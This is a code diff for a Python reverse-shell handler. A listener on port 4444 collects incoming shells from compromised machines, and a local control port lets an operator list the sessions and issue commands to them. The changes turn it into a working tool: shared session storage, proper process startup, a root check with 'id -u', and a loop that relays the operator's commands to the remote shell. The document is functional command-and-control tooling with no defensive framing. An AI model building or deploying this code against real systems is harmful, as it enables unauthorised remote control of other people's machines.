@@ -1,7 +1,7 @@
 import argparse
 import random
 import socket
-from multiprocessing import Process
+from multiprocessing import Process, Manager
 
 import datetime
 
@@ -13,7 +13,8 @@ parser.add_argument('--shell-port', type=int, default=4444, help="TCP port to us
 
 args = parser.parse_args()
 
-sessions = []
+manager = Manager()
+sessions = manager.list()
 server_started = datetime.datetime.now()
 PROMPT = '=> '
 
@@ -31,7 +32,7 @@ class Connection(Process):
         self.addr = addr
         super().__init__()
 
-    def conni(self):
+    def run(self):
         welcome = "Server started at {}. {} session{} active.\n".format(
             server_started,
             len(sessions),
@@ -40,15 +41,36 @@ class Connection(Process):
         welcome = "Type (l) to list sessions, and (i) to interact with a session.\n"
         self.conn.send(welcome.encode())
         while True:
-            self.conn.send(PROMPT.encode())
+            try:
+                self.conn.send(PROMPT.encode())
+            except BrokenPipeError:
+                break
             r = self.conn.recv(1024).decode().strip()
             if r == 'l':
                 session_list = "Active sessions:\n"
                 for n, session in enumerate(sessions):
-                    session_list += "({}) {}\n".format(n, session[0])
+                    session_list += "({}) {}\n".format(n, session[0][0])
                 self.conn.send(session_list.encode())
             elif r.startswith('i'):
-
+                try:
+                    addr, conn = sessions[int(r.split()[1])]
+                except IndexError:
+                    self.conn.send(b"Specify a valid session ID.\n")
+                else:
+                    self.conn.send("Entering interactive shell on {}. Ctrl+D to quit.\n".format(addr[0]).encode())
+                    conn.send(b"id -u\n")
+                    uid = int(conn.recv(100).decode())
+                    if not uid:
+                        prompt = b'# '
+                    else:
+                        prompt = b'$ '
+                    while True:
+                        self.conn.send(prompt)
+                        cmd = self.conn.recv(1024)
+                        if cmd == b'\x04':
+                            break
+                        conn.send(cmd)
+                        self.conn.send(conn.recv(1024))
 
 
 class StoppableServer(Process):
@@ -67,19 +89,20 @@ class StoppableServer(Process):
 
 
 class ShellServer(StoppableServer):
-    def __init__(self, host: str="0.0.0.0", port: int=4444):
+    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
         super().__init__(host, port)
 
     def run(self) -> None:
         print("Listening for shell connections")
         while not self.stopped():
-            conn, addr = self.shell_sock.accept()
+            conn, addr = self.sock.accept()
+            print("New shell from", addr[0])
             sessions.append((addr, conn))
         self.sock.close()
 
 
 class ControlServer(StoppableServer):
-    def __init__(self, host: str ='127.0.0.1', port: int=5555):
+    def __init__(self, host: str = '127.0.0.1', port: int = 5555):
         self.connections = []
         super().__init__(host, port)
 
@@ -88,19 +111,17 @@ class ControlServer(StoppableServer):
         while not self.stopped():
             c = Connection(*self.sock.accept())
             self.connections.append(c)
-            c.conni()
+            c.start()
         self.sock.close()
 
 
 if __name__ == '__main__':
     ss = ShellServer(port=args.shell_port)
-    rand = random.randint(1024, 65535)
-    print(rand)
-    cs = ControlServer(port=rand)  # args.control_port)
+    cs = ControlServer(port=args.control_port)
     try:
-        cs.serve()
         ss.start()
+        cs.serve()
     except (KeyboardInterrupt, Exception) as e:
-        cs.stop()
         ss.stop()
+        cs.stop()
         raise e
